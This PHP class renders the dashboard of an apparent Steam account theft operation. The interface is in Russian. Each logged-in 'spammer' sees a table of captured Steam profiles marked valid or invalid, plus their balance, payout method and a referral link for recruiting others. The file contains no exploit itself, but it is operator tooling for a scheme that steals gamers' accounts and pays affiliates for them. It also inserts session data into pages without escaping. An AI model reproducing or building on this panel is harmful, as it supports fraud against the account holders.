<?php
require_once("classPanel.php");

	class PageGenerator {
		private $PathToTemplate;
		
		function __construct($PathToTemplate){
			$this->PathToTemplate = $PathToTemplate;
		}
		
		private function _generatePage($head, $content) {
			$layout = file_get_contents($this->PathToTemplate . "/layout.html");
			$Panel = new classPanel();
			
			$page = str_replace
			(
				array("%head%", "%spammer_login%", "%content%"),
				array($head, $_SESSION["spammer_login"], $content),
				$layout
			);
			
			return $page;
		}
		
		public function GenerateIndex(){
			$head = 
			"
			<style>
				::-webkit-scrollbar {
				width: 10px; /** width of total scrollbar **/
				background: #fff; /** background of scrollbar **/
				border: 1px solid #000; /** border around whole scrollbar **/
				}

				::-webkit-scrollbar-thumb {
				background: rgba(0, 0, 0, 0.5); /** color of the moving part of the scrollbar (thumb) **/
				border: 1px solid #000; /** border around moving part of scrollbar (overlaps with border of total scrollbar) **/
				}
			</style>
			";
			
			$content = file_get_contents($this->PathToTemplate . "/pages/main.html");
			
			$Panel = new classPanel();
			
			$spammer = $Panel->arr_GetSpammerByLogin($_SESSION["spammer_login"]);
			
			if ($Panel->b_AccountsExist($_SESSION["spammer_login"])) {
				/*
				 *     TABLE
				 */
				
				$table_tpl = 
				'
							<table id="data-table" class="table dataTable no-footer" role="grid" aria-describedby="data-table_info">
                                <thead>
                                    <tr role="row">
										<th>Ссылка</th>
										<th>Время</th>
										<th>Статус</th>
									</tr>
                                </thead>
                                <tbody>
									%table_content%
								</tbody>
                            </table>
				';
				
				$row_tpl = 
				'
                                    <td><a href="http://steamcommunity.com/profiles/%steamid%" target="_blank">Профиль</a></td>
									<td>%time%</td>
									<td>%status%</td>
								</tr>
				';
				
				$rows = "";
				$accounts = $Panel->arr_GetAccounts($_SESSION["spammer_login"]);
				
				for ($i = 0; $i < count($accounts); $i++) {
					if ($accounts[$i]["status"] == 0) $status = "Невалид";
					else $status = "Валид";
					
					$rows .= str_replace
					(
						array("%steamid%", "%time%", "%id%", "%status%"),
						array(
							$accounts[$i]["steamid"], 
							date("H:i", $accounts[$i]["time"]),
							$accounts[$i]["id"],
							$status
						),
						$row_tpl
					);
				}
				
				$table = str_replace("%table_content%", $rows, $table_tpl);
				/*
				 *     /TABLE
				 */
				
				$content = str_replace
				(
					array("%table%", "%balance%", "%payment_system%", "%ref_link%", "%id%"),
					array($table, $spammer["balance"], $spammer["payment_system"], $_SERVER["SERVER_NAME"] . "/?ref=" . $_SESSION["spammer_login"], $spammer["id"]),
					$content
				);
			}
			else {
				$content = str_replace
				(
					array("%table%", "%balance%", "%payment_system%", "%ref_link%", "%id%"),
					array('<p class="text-center">Нет аккаунтов в базе</p>', $spammer["balance"], $spammer["payment_system"], $_SERVER["SERVER_NAME"] . "/?ref=" . $_SESSION["spammer_login"], $spammer["id"]),
					$content
				);
			}
			
			$Page = self::_generatePage($head, $content);
			return $Page;
		}
		
		public function GenerateAuth(){
			$Page = file_get_contents($this->PathToTemplate . "/pages/auth.html");
			
			return $Page;
		}
	}
?>